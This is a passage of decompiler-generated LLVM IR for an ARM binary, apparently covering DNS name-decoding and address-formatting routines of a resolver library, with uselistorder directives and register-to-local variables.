dec_label_pc_16464:                               ; preds = %dec_label_pc_16458
  %v0_16464 = load i32, i32* @r6, align 4
  %v2_16464 = icmp eq i32 %v0_16464, 0
  store i1 %v2_16464, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16464, label %dec_label_pc_1646c, label %dec_label_pc_164c0

dec_label_pc_1646c:                               ; preds = %dec_label_pc_16464
  %v0_1646c = load i32, i32* @r7, align 4
  %v7_1646c = icmp eq i32 %v0_1646c, 6
  store i1 %v7_1646c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1646c, label %dec_label_pc_1648c, label %dec_label_pc_16474

dec_label_pc_16474:                               ; preds = %dec_label_pc_1646c
  %v7_16474 = icmp eq i32 %v0_1646c, 5
  store i1 %v7_16474, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16474, label %dec_label_pc_1647c, label %dec_label_pc_164c0

dec_label_pc_1647c:                               ; preds = %dec_label_pc_16474
  store i1 %v9_16484, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16484, label %dec_label_pc_1648c, label %dec_label_pc_164c0

dec_label_pc_1648c:                               ; preds = %dec_label_pc_1647c, %dec_label_pc_1646c
  %v2_16490 = sub i32 %v2_1635c, %v5_1645c
  %v1_16494 = add i32 %v2_16490, -32
  store i32 %v1_16494, i32* %r2.global-to-local, align 4
  %v0_16498 = load i32, i32* @r8, align 4
  %v1_16498 = add i32 %v0_16498, 12
  store i32 %v1_16498, i32* %r0.global-to-local, align 4
  %v3_164a0 = call i32 @function_161a4(i32 %v1_16498, i32 %v5_1645c, i32 %v1_16494)
  store i32 %v3_164a0, i32* %r0.global-to-local, align 4
  %v2_164a4 = icmp eq i32 %v3_164a0, 0
  store i1 %v2_164a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_164a4, label %bb56, label %dec_label_pc_164b0

bb56:                                             ; preds = %dec_label_pc_1648c
  %v1_164a8 = load i32, i32* @r6, align 4
  store i32 %v1_164a8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16550

dec_label_pc_164b0:                               ; preds = %dec_label_pc_1648c
  %v0_164b0 = load i32, i32* @r4, align 4
  store i32 %v0_164b0, i32* @r0, align 4
  %v0_164b4 = call i32 @function_f670()
  store i32 %v0_164b4, i32* %r0.global-to-local, align 4
  %v0_164b8 = load i32, i32* @r4, align 4
  %v2_164b8 = add i32 %v0_164b8, %v0_164b4
  store i32 %v2_164b8, i32* @r4, align 4
  %v0_164f0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_164f0

dec_label_pc_164c0:                               ; preds = %dec_label_pc_1647c, %dec_label_pc_16474, %dec_label_pc_16464, %dec_label_pc_16458, %dec_label_pc_16450
  %v0_164c8 = phi i32 [ %v5_1645c, %dec_label_pc_1647c ], [ %v5_1645c, %dec_label_pc_16474 ], [ %v5_1645c, %dec_label_pc_16464 ], [ %v5_1645c, %dec_label_pc_16458 ], [ %v2_1645c68, %dec_label_pc_16450 ]
  store i32 %v2_1635c, i32* @lr, align 4
  %v1_164c4 = load i32, i32* @r5, align 4
  %v4_164c4 = mul i32 %v1_164c4, 4
  %v5_164c4 = add i32 %v4_164c4, %v2_1635c
  store i32 %v0_164c8, i32* @r0, align 4
  %v1_164cc = add i32 %v5_164c4, -32
  %v2_164cc = inttoptr i32 %v1_164cc to i32*
  %v3_164cc = load i32, i32* %v2_164cc, align 4
  store i32 %v3_164cc, i32* %r2.global-to-local, align 4
  %v0_164d0 = load i32, i32* @fp, align 4
  %v5_164d4 = call i32 @function_d300(i32 %v0_164c8, i32 %v0_164d0, i32 %v3_164cc, i32 %v5_164c4)
  store i32 %v5_164d4, i32* %r0.global-to-local, align 4
  %v0_164d8 = load i32, i32* @r4, align 4
  %v2_164d8 = add i32 %v0_164d8, %v5_164d4
  store i32 %v2_164d8, i32* @r4, align 4
  br label %dec_label_pc_164dc

dec_label_pc_164dc:                               ; preds = %bb55, %dec_label_pc_16444, %dec_label_pc_164c0
  %v3_1644829 = phi i32 [ %v6_16448, %bb55 ], [ %v2_1645c68, %dec_label_pc_16444 ], [ %v2_164d8, %dec_label_pc_164c0 ]
  %v0_164dc = load i32, i32* @r5, align 4
  %v1_164dc = add i32 %v0_164dc, 1
  store i32 %v1_164dc, i32* @r5, align 4
  %v0_1642c.pre = load i32, i32* @r6, align 4
  %v7_164e4 = icmp slt i32 %v1_164dc, 8
  %v7_1642c = icmp eq i32 %v0_1642c.pre, -1
  store i1 %v7_1642c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_164e4, label %dec_label_pc_1642c, label %dec_label_pc_164e8

dec_label_pc_164e8:                               ; preds = %dec_label_pc_164dc
  br i1 %v7_1642c, label %.thread2, label %dec_label_pc_164f0

dec_label_pc_164f0:                               ; preds = %dec_label_pc_164e8, %dec_label_pc_164b0
  %v3_164fc = phi i32 [ %v3_1644829, %dec_label_pc_164e8 ], [ %v2_164b8, %dec_label_pc_164b0 ]
  %v0_164f0 = phi i32 [ %v0_1642c.pre, %dec_label_pc_164e8 ], [ %v0_164f0.pre, %dec_label_pc_164b0 ]
  %v1_164f0 = load i32, i32* @r7, align 4
  %v2_164f0 = add i32 %v1_164f0, %v0_164f0
  %v7_164f4 = icmp eq i32 %v2_164f0, 8
  store i1 %v7_164f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_164f4, label %bb57, label %.thread2

bb57:                                             ; preds = %dec_label_pc_164f0
  %v4_164fc = inttoptr i32 %v3_164fc to i8*
  store i8 58, i8* %v4_164fc, align 1
  %v5_164fc = load i32, i32* @r4, align 4
  %v6_164fc = add i32 %v5_164fc, 1
  store i32 %v6_164fc, i32* @r4, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_164f0, %dec_label_pc_164e8, %bb57
  %v2_16504 = phi i32 [ %v3_164fc, %dec_label_pc_164f0 ], [ %v3_1644829, %dec_label_pc_164e8 ], [ %v6_164fc, %bb57 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_16504 = inttoptr i32 %v2_16504 to i8*
  store i8 0, i8* %v3_16504, align 1
  %v4_16504 = load i32, i32* @r4, align 4
  %v5_16504 = add i32 %v4_16504, 1
  store i32 %v2_16414, i32* @r1, align 4
  %v2_1650c = load i32, i32* %stack_var_-128, align 4
  store i32 %v2_1650c, i32* %r2.global-to-local, align 4
  %v2_16510 = sub i32 %v5_16504, %v2_16414
  %v9_16514 = icmp eq i32 %v2_16510, %v2_1650c
  store i1 %v9_16514, i1* %cpsr_z.global-to-local, align 1
  %tmp74 = icmp ugt i32 %v2_16510, %v2_1650c
  br i1 %tmp74, label %dec_label_pc_1651c, label %dec_label_pc_16530

dec_label_pc_1651c:                               ; preds = %.thread2
  %v0_1651c = call i32 @function_d0ec()
  store i32 %v0_1651c, i32* %r0.global-to-local, align 4
  %v0_16524 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_16524, i32* %r2.global-to-local, align 4
  %v2_16528 = inttoptr i32 %v0_1651c to i32*
  store i32 28, i32* %v2_16528, align 4
  %v0_16550.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16550

dec_label_pc_16530:                               ; preds = %.thread2
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_16534 = inttoptr i32 %arg3 to i8*
  %v3_16534 = call i32 @function_f8ec(i8* %v2_16534, i32 %v2_16414)
  br label %dec_label_pc_16538

dec_label_pc_16538:                               ; preds = %dec_label_pc_16318, %dec_label_pc_16530
  %storemerge = phi i32 [ %v3_16324, %dec_label_pc_16318 ], [ %v3_16534, %dec_label_pc_16530 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16550

dec_label_pc_16540:                               ; preds = %dec_label_pc_1630c
  %v0_16540 = call i32 @function_d0ec()
  store i32 %v0_16540, i32* %r0.global-to-local, align 4
  %v2_16548 = inttoptr i32 %v0_16540 to i32*
  store i32 97, i32* %v2_16548, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16550

dec_label_pc_16550:                               ; preds = %bb56, %dec_label_pc_16538, %dec_label_pc_1651c, %dec_label_pc_16540
  %v0_16550 = phi i32 [ %v1_164a8, %bb56 ], [ %storemerge, %dec_label_pc_16538 ], [ %v0_16550.pre, %dec_label_pc_1651c ], [ 0, %dec_label_pc_16540 ]
  store i32 %v0_16550, i32* %r0.global-to-local, align 4
  store i32 %v6_162e8, i32* %r5.global-to-local, align 4
  ret i32 %v0_16550

; uselistorder directives
  uselistorder i32 %v0_16550, { 1, 0 }
  uselistorder i1 %v7_1642c, { 2, 0, 1 }
  uselistorder i32 %v0_1642c.pre, { 1, 0, 2 }
  uselistorder i32 %v1_164dc, { 0, 2, 1 }
  uselistorder i32 %v0_164c8, { 1, 0 }
  uselistorder i32 %v5_1645c, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i1 %v9_16434, { 1, 0, 2 }
  uselistorder i32 %v2_1645c68, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1645870, { 5, 4, 2, 3, 0, 1 }
  uselistorder i1 %v7_1642c67, { 1, 0 }
  uselistorder i32 %v2_16414, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_16424, { 1, 0, 2 }
  uselistorder i1 %v7_16400, { 1, 0 }
  uselistorder i32 %v0_16400, { 1, 2, 0 }
  uselistorder i32 %v1_16424.pre, { 2, 0, 1 }
  uselistorder i32 %v0_163f8.pre, { 0, 1, 3, 2 }
  uselistorder i1 %v7_163e8, { 1, 0 }
  uselistorder i1 %v7_163e0, { 1, 0 }
  uselistorder i32 %v1_163d4, { 1, 0 }
  uselistorder i32 %v0_163e8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_163fc, { 1, 2, 0, 3 }
  uselistorder i1 %v7_1639c, { 1, 0 }
  uselistorder i32 %v0_163d4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_163b8, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_163c8, { 3, 1, 0, 2 }
  uselistorder i32 %v1_16358, { 1, 0, 2 }
  uselistorder i32 %v2_16340, { 1, 0 }
  uselistorder i32 %v0_16358, { 3, 1, 0, 2 }
  uselistorder i32 %v2_1635c, { 0, 4, 3, 1, 5, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 1, 4, 5, 6, 7, 12, 8, 9, 10, 11, 14, 13, 15, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 13, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 22, 14, 15, 16, 17, 18, 23, 19, 20, 21 }
  uselistorder i32 97, { 2, 3, 5, 1, 0, 6, 4 }
  uselistorder i8 58, { 0, 3, 4, 1, 5, 6, 7, 2, 8, 9 }
  uselistorder i32 (i32, i32, i32, i32)* @function_d300, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_ffff.530 to i32), { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @function_161a4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16550, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_16538, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_164dc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1642c, { 1, 0 }
  uselistorder label %dec_label_pc_16400._crit_edge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16400, { 2, 1, 0 }
  uselistorder label %dec_label_pc_163f8, { 1, 0 }
  uselistorder label %dec_label_pc_163d4, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_163d0, { 1, 0 }
  uselistorder label %dec_label_pc_16388, { 1, 0 }
}

define i32 @function_1656c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_1656c:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_0, align 4
  %v6_1656c = load i32, i32* @r5, align 4
  %v0_16570 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16570, i32* %sl.global-to-local, align 4
  %v2_16570 = icmp eq i32 %v0_16570, 0
  br i1 %v2_16570, label %.thread30, label %dec_label_pc_16598.preheader

.thread30:                                        ; preds = %dec_label_pc_1656c
  store i32 %arg2, i32* %fp.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_16658

dec_label_pc_16598.preheader:                     ; preds = %dec_label_pc_1656c
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %fp.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_165984 = load i32, i32* @r1, align 4
  %v6_1659c14 = icmp slt i32 %v0_165984, %arg2
  br i1 %v6_1659c14, label %dec_label_pc_165a0.preheader, label %dec_label_pc_16658

dec_label_pc_165a0.preheader:                     ; preds = %dec_label_pc_16598.preheader
  %v2_165a051 = add i32 %v0_16570, %v0_165984
  %v3_165a052 = inttoptr i32 %v2_165a051 to i8*
  %v4_165a053 = load i8, i8* %v3_165a052, align 1
  %v6_165a054 = zext i8 %v4_165a053 to i32
  store i32 %v6_165a054, i32* @r4, align 4
  %v2_165a455 = icmp eq i8 %v4_165a053, 0
  br i1 %v2_165a455, label %bb49, label %dec_label_pc_165ac

dec_label_pc_16594:                               ; preds = %bb48, %bb44
  %v1_16598 = phi i32 [ %v1_16598.pre, %bb48 ], [ %v1_165c459, %bb44 ]
  %v0_16598 = phi i32 [ %v0_16598.pre, %bb48 ], [ %v5_165dc, %bb44 ]
  %v0_16594 = phi i32 [ %v0_16594.pre, %bb48 ], [ %v0_165e060, %bb44 ]
  store i32 %v0_16594, i32* %r0.global-to-local, align 4
  %v6_1659c = icmp slt i32 %v0_16598, %v1_16598
  br i1 %v6_1659c, label %dec_label_pc_16594.dec_label_pc_165a0_crit_edge, label %dec_label_pc_16658

dec_label_pc_16594.dec_label_pc_165a0_crit_edge:  ; preds = %dec_label_pc_16594
  %v0_165a0.pre = load i32, i32* %sl.global-to-local, align 4
  %v2_165a0 = add i32 %v0_165a0.pre, %v0_16598
  %v3_165a0 = inttoptr i32 %v2_165a0 to i8*
  %v4_165a0 = load i8, i8* %v3_165a0, align 1
  %v6_165a0 = zext i8 %v4_165a0 to i32
  store i32 %v6_165a0, i32* @r4, align 4
  %v2_165a4 = icmp eq i8 %v4_165a0, 0
  %v0_16644 = load i32, i32* @ip, align 4
  %v2_16644 = icmp eq i32 %v0_16644, 0
  br i1 %v2_165a4, label %dec_label_pc_16644, label %dec_label_pc_165ac

dec_label_pc_165ac:                               ; preds = %dec_label_pc_165a0.preheader, %dec_label_pc_16594.dec_label_pc_165a0_crit_edge
  %v2_1664466 = phi i1 [ %v2_16644, %dec_label_pc_16594.dec_label_pc_165a0_crit_edge ], [ false, %dec_label_pc_165a0.preheader ]
  %v0_1664464 = phi i32 [ %v0_16644, %dec_label_pc_16594.dec_label_pc_165a0_crit_edge ], [ 1, %dec_label_pc_165a0.preheader ]
  %v6_165a063 = phi i32 [ %v6_165a0, %dec_label_pc_16594.dec_label_pc_165a0_crit_edge ], [ %v6_165a054, %dec_label_pc_165a0.preheader ]
  %v0_165cc62 = phi i32 [ %v0_165a0.pre, %dec_label_pc_16594.dec_label_pc_165a0_crit_edge ], [ %v0_16570, %dec_label_pc_165a0.preheader ]
  %v0_165bc61 = phi i32 [ %v0_16598, %dec_label_pc_16594.dec_label_pc_165a0_crit_edge ], [ %v0_165984, %dec_label_pc_165a0.preheader ]
  %v0_165e060 = phi i32 [ %v0_16594, %dec_label_pc_16594.dec_label_pc_165a0_crit_edge ], [ 0, %dec_label_pc_165a0.preheader ]
  %v1_165c459 = phi i32 [ %v1_16598, %dec_label_pc_16594.dec_label_pc_165a0_crit_edge ], [ %arg2, %dec_label_pc_165a0.preheader ]
  %v1_165b0 = and i32 %v6_165a063, 192
  br i1 %v2_1664466, label %bb42, label %bb

bb:                                               ; preds = %dec_label_pc_165ac
  %v1_165b4 = load i32, i32* %r8.global-to-local, align 4
  %v2_165b4 = add i32 %v1_165b4, 1
  store i32 %v2_165b4, i32* %r8.global-to-local, align 4
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_165ac, %bb
  %v2_165b8 = icmp eq i32 %v1_165b0, 192
  %v1_165bc = add i32 %v0_165bc61, 1
  store i32 %v1_165bc, i32* %r1.global-to-local, align 4
  br i1 %v2_165b8, label %dec_label_pc_165c4, label %dec_label_pc_165ec

dec_label_pc_165c4:                               ; preds = %bb42
  %v6_165c8 = icmp slt i32 %v1_165bc, %v1_165c459
  br i1 %v6_165c8, label %dec_label_pc_165cc, label %dec_label_pc_16658

dec_label_pc_165cc:                               ; preds = %dec_label_pc_165c4
  %v2_165cc = add i32 %v1_165bc, %v0_165cc62
  %v3_165cc = inttoptr i32 %v2_165cc to i8*
  %v4_165cc = load i8, i8* %v3_165cc, align 1
  %v6_165cc = zext i8 %v4_165cc to i32
  %v1_165d4 = urem i32 %v6_165a063, 64
  br i1 %v2_1664466, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_165cc
  %v1_165d8 = load i32, i32* %r8.global-to-local, align 4
  %v2_165d8 = add i32 %v1_165d8, 1
  store i32 %v2_165d8, i32* %r8.global-to-local, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_165cc, %bb43
  %v4_165dc = mul nuw nsw i32 %v1_165d4, 256
  %v5_165dc = or i32 %v6_165cc, %v4_165dc
  store i32 %v5_165dc, i32* %r1.global-to-local, align 4
  store i32 %v0_165e060, i32* %r7.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_16594

dec_label_pc_165ec:                               ; preds = %bb42
  %v2_165ec = add i32 %v6_165a063, %v0_165e060
  store i32 %v2_165ec, i32* %r6.global-to-local, align 4
  %v3_165f0 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_165f0, i32* @r3, align 4
  %v1_165f4 = add i32 %v2_165ec, 1
  store i32 %v1_165f4, i32* %r7.global-to-local, align 4
  %v3_165f8 = icmp ult i32 %v1_165f4, %v3_165f0
  br i1 %v3_165f8, label %dec_label_pc_16600, label %dec_label_pc_16658

dec_label_pc_16600:                               ; preds = %dec_label_pc_165ec
  %v2_16600 = add i32 %v6_165a063, %v1_165bc
  store i32 %v2_16600, i32* @r5, align 4
  %v3_16604 = icmp ult i32 %v2_16600, %v1_165c459
  br i1 %v3_16604, label %dec_label_pc_1660c, label %dec_label_pc_16658

dec_label_pc_1660c:                               ; preds = %dec_label_pc_16600
  %v2_1660c = add i32 %v1_165bc, %v0_165cc62
  store i32 %v2_1660c, i32* @r1, align 4
  %v0_16610 = load i32, i32* %sb.global-to-local, align 4
  %v2_16610 = add i32 %v0_16610, %v0_165e060
  store i32 %v2_16610, i32* @r0, align 4
  store i32 %v6_165a063, i32* @r2, align 4
  %v0_1661c = call i32 @function_f700()
  store i32 %v0_1661c, i32* %r0.global-to-local, align 4
  store i32 %v0_1664464, i32* @ip, align 4
  %v0_16624 = load i32, i32* %sl.global-to-local, align 4
  %v1_16624 = load i32, i32* @r5, align 4
  %v2_16624 = add i32 %v1_16624, %v0_16624
  %v3_16624 = inttoptr i32 %v2_16624 to i8*
  %v4_16624 = load i8, i8* %v3_16624, align 1
  br i1 %v2_1664466, label %bb46, label %bb45

bb45:                                             ; preds = %dec_label_pc_1660c
  %v1_1662c = load i32, i32* %r8.global-to-local, align 4
  %v2_1662c = load i32, i32* @r4, align 4
  %v3_1662c = add i32 %v2_1662c, %v1_1662c
  store i32 %v3_1662c, i32* %r8.global-to-local, align 4
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_1660c, %bb45
  %v2_16630 = icmp eq i8 %v4_16624, 0
  br i1 %v2_16630, label %bb48, label %bb47

bb47:                                             ; preds = %bb46
  br label %bb48

bb48:                                             ; preds = %bb46, %bb47
  %v0_1663c.off0 = phi i8 [ 0, %bb46 ], [ 46, %bb47 ]
  store i32 %v1_16624, i32* %r1.global-to-local, align 4
  %v2_1663c = load i32, i32* %sb.global-to-local, align 4
  %v3_1663c = load i32, i32* %r6.global-to-local, align 4
  %v4_1663c = add i32 %v3_1663c, %v2_1663c
  %v5_1663c = inttoptr i32 %v4_1663c to i8*
  store i8 %v0_1663c.off0, i8* %v5_1663c, align 1
  %v0_16594.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_16598.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_16598.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_16594

dec_label_pc_16644:                               ; preds = %dec_label_pc_16594.dec_label_pc_165a0_crit_edge
  %v0_1664c.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_16644, label %dec_label_pc_16658, label %bb49

bb49:                                             ; preds = %dec_label_pc_165a0.preheader, %dec_label_pc_16644
  %v0_1664c.pre69 = phi i32 [ %v0_1664c.pre.pre, %dec_label_pc_16644 ], [ 0, %dec_label_pc_165a0.preheader ]
  %v2_16648 = add i32 %v0_1664c.pre69, 1
  store i32 %v2_16648, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_16658

dec_label_pc_16658:                               ; preds = %dec_label_pc_16600, %dec_label_pc_165ec, %dec_label_pc_165c4, %dec_label_pc_16594, %dec_label_pc_16644, %dec_label_pc_16598.preheader, %bb49, %.thread30
  %storemerge = phi i32 [ -1, %.thread30 ], [ %v2_16648, %bb49 ], [ -1, %dec_label_pc_16598.preheader ], [ %v0_1664c.pre.pre, %dec_label_pc_16644 ], [ -1, %dec_label_pc_165ec ], [ -1, %dec_label_pc_16600 ], [ -1, %dec_label_pc_16594 ], [ -1, %dec_label_pc_165c4 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v6_1656c, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_1664c.pre.pre, { 1, 0 }
  uselistorder i32 %v1_16624, { 1, 0 }
  uselistorder i32 %v5_165dc, { 1, 0 }
  uselistorder i32 %v1_165bc, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_165e060, { 3, 2, 0, 1 }
  uselistorder i32 %v6_165a063, { 2, 4, 3, 0, 1 }
  uselistorder i1 %v2_1664466, { 1, 2, 0 }
  uselistorder i32 %v0_16570, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 4, 1, 5, 2, 6, 3, 7, 8 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 3, 4, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_16658, { 6, 4, 0, 1, 2, 3, 5, 7 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %dec_label_pc_165ac, { 1, 0 }
}

define i32 @function_16664(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_16664:
  %cpsr_c.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp144 = call i32 @__decompiler_undefined_function_0()
  %tmp159 = call i32 @__decompiler_undefined_function_0()
  %tmp160 = call i32 @__decompiler_undefined_function_0()
  %tmp161 = call i32 @__decompiler_undefined_function_0()
  %tmp172 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-448 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-104 = alloca i16, align 2
  %stack_var_-76 = alloca i32, align 4
  %v3_16664 = load i32, i32* @r4, align 4
  %v6_16664 = load i32, i32* @r5, align 4
  %v9_16664 = load i32, i32* @r6, align 4
  %v12_16664 = load i32, i32* @r7, align 4
  %v15_16664 = load i32, i32* @r8, align 4
  %v18_16664 = load i32, i32* @sb, align 4
  %v21_16664 = load i32, i32* @sl, align 4
  %v24_16664 = load i32, i32* @fp, align 4
  %v27_16664 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg4, i32* @fp, align 4
  %v0_16678 = load i32, i32* %r1.global-to-local, align 4
  %v1_16680 = call i32 @function_10110(i32 512)
  store i32 %v1_16680, i32* @sl, align 4
  %v0_16688 = load i32, i32* @r4, align 4
  store i32 %v0_16688, i32* @r0, align 4
  %v0_1668c = call i32 @function_f670()
  store i32 894, i32* %r3.global-to-local, align 4
  %v3_16698 = icmp ugt i32 %v0_1668c, 893
  store i1 %v3_16698, i1* %cpsr_c.global-to-local, align 1
  store i32 142964, i32* @r8, align 4
  %tmp285 = icmp ugt i32 %v0_1668c, 894
  br i1 %tmp285, label %.thread132, label %dec_label_pc_166b8

.thread132:                                       ; preds = %dec_label_pc_16664
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16dc8

dec_label_pc_166b8:                               ; preds = %dec_label_pc_16664
  %v1_166bc = add i32 %v0_1668c, 130
  %v1_166c0 = call i32 @function_10110(i32 %v1_166bc)
  store i32 %v1_166c0, i32* @r0, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_166c4 = icmp eq i32 %v1_166c0, 0
  br i1 %v2_166c4, label %.thread5, label %bb

bb:                                               ; preds = %dec_label_pc_166b8
  %v1_166c8 = load i32, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_166c8 = icmp eq i32 %v1_166c8, 0
  br i1 %v3_166c8, label %bb213, label %dec_label_pc_166dc

.thread5:                                         ; preds = %dec_label_pc_166b8
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_16dc0

bb213:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_16dc0

dec_label_pc_166dc:                               ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v0_166dc = load i32, i32* @r4, align 4
  %v1_166dc = inttoptr i32 %v0_166dc to i8*
  %v2_166dc = load i8, i8* %v1_166dc, align 1
  %v3_166dc = zext i8 %v2_166dc to i32
  store i32 %v3_166dc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_166e0 = icmp eq i8 %v2_166dc, 0
  br i1 %v2_166e0, label %dec_label_pc_16dc0, label %dec_label_pc_166e8

dec_label_pc_166e8:                               ; preds = %dec_label_pc_166dc
  %v2_166ec = add i32 %v0_166dc, %v0_1668c
  store i32 %v2_166ec, i32* %r3.global-to-local, align 4
  %v1_166f0 = add i32 %v2_166ec, -1
  %v2_166f0 = inttoptr i32 %v1_166f0 to i8*
  %v3_166f0 = load i8, i8* %v2_166f0, align 1
  %v4_166f0 = zext i8 %v3_166f0 to i32
  store i32 %v4_166f0, i32* @r3, align 4
  store i32 %v0_1668c, i32* @r2, align 4
  store i32 %v0_166dc, i32* @r1, align 4
  %v0_16700 = call i32 @function_f700()
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 12312, i32* %ip.global-to-local, align 4
  store i32 10756, i32* %r1.global-to-local, align 4
  store i32 -1, i32* @sb, align 4
  %v2_1677c = ptrtoint i32* %stack_var_-76 to i32
  %v2_16894 = ptrtoint i16* %stack_var_-104 to i32
  %v15_16898 = ptrtoint i32* %stack_var_-88 to i32
  %v2_168bc = ptrtoint i32* %stack_var_-192 to i32
  %v2_168dc = bitcast i32* %stack_var_-192 to i8*
  %v2_16990 = ptrtoint i32* %stack_var_-48 to i32
  %v2_1699c = ptrtoint i32* %stack_var_-56 to i32
  %v2_16a28 = icmp eq i32 %tmp161, 0
  %v1_16a34 = add i32 %tmp160, -2
  %v2_16a38 = icmp ne i32 %v1_16a34, 0
  %tmp214 = icmp slt i32 %tmp159, 1
  %v2_16b24 = ptrtoint i32* %stack_var_-448 to i32
  %v2_16b28 = ptrtoint i32* %stack_var_-144 to i32
  %v5_16d6c56 = icmp sgt i32 %tmp159, 0
  %v2_16c94 = icmp ne i32 %v0_16678, 0
  %v7_16c94 = icmp eq i32 %v0_16678, 1
  %v2_16c3c = icmp eq i32 %tmp144, 0
  %v2_16a44 = icmp ugt i8 %v3_166f0, 45
  %v7_16a44 = icmp eq i8 %v3_166f0, 46
  %v1_167f0 = add i32 %v1_166c0, 1
  %stack_var_-476.0.pre = load i32, i32* @r5, align 4
  %v4_167d0 = add i32 %v1_166c0, %v0_1668c
